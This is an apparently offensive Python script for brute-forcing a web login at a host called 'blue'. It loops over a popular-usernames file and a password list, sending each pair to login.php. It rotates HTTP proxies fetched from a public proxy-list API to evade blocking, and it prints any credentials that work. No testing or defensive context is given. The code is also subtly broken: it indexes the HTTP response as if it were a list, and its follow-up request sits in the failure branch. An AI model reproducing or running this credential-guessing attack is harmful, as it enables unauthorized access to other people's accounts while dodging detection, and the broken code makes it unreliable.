import requests

session = requests.Session()

ipIndex = 0
curRequest = 0

ip_addresses = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all')
cur_ip = ip_addresses[ipIndex]

# read passwords from file nord-pass.csv and store in list using comma delimiter
with open('nord-pass.csv', 'r') as f:
    passwords = f.read().splitlines()

with open('popular-usernames.csv', 'r') as f:
    usernames = f.read().splitlines()
    
for username in usernames:
    # set requests ip to the next ip in the list
    ipIndex = ipIndex + 1
    if ipIndex == len(ip_addresses):
        ipIndex = 0
    
    cur_ip = ip_addresses[ipIndex]
    session.proxies = {'http': cur_ip}
    # session.proxies = {'http': cur_ip, 'https': cur_ip}

    for password in passwords:
        url = 'http://blue/login.php?user=' + username + '&pass=' + password
        
        # Send the login request and check if it was successful
        response = requests.post(url)
        if "Invalid username or password" not in response.text:
            print("Found weak username and password: " + username + " " + password)
        else:
            url_manage = 'http://blue/manage.php?action=close'
            r2 = requests.post(url_manage, cookies=response.cookies)
            # success